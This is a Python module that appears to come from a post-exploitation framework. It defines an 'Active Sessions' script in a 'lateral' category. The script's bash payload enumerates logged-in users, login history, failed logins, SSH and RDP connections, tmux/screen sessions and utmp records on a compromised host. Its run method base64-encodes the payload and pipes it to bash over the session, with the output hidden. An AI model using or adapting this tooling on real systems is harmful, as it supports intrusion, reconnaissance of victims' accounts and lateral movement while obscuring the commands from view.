"""Active session enumeration script."""

from ..base import OperatorScript, ScriptResult


class ActiveSessions(OperatorScript):
    """Enumerate current SSH/RDP sessions and logged-in users."""
    
    name = "Active Sessions"
    description = "Enumerate current SSH/RDP sessions and logged-in users"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] ACTIVE SESSIONS"
echo "=================="
echo ""

echo "[+] Currently logged in users:"
w 2>/dev/null || who
echo ""

echo "[+] Who is logged in (detailed):"
who -a 2>/dev/null
echo ""

echo "[+] Last logins:"
last | head -30
echo ""

echo "[+] Failed login attempts:"
lastb 2>/dev/null | head -20 || echo "[-] lastb not available or requires root"
echo ""

echo "[+] Active SSH sessions:"
ss -tnp 2>/dev/null | grep ":22" || netstat -tnp 2>/dev/null | grep ":22"
echo ""

echo "[+] Active RDP sessions (Windows/xrdp):"
ss -tnp 2>/dev/null | grep ":3389" || netstat -tnp 2>/dev/null | grep ":3389"
echo ""

echo "[+] TTY sessions:"
ps aux | grep -E "sshd|login|bash|sh" | grep -v grep
echo ""

echo "[+] User processes:"
ps aux | awk '{print $1}' | sort -u | while read user; do
    COUNT=$(ps aux | grep "^$user" | wc -l)
    echo "$user: $COUNT processes"
done
echo ""

echo "[+] Checking for screen/tmux sessions:"
ls -la /var/run/screen 2>/dev/null
ls -la /tmp/tmux* 2>/dev/null
echo ""

echo "[+] Utmp information:"
utmpdump /var/run/utmp 2>/dev/null | tail -20
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Enumerating active sessions...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Active sessions enumeration executed",
                metadata={"script": "active_sessions"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
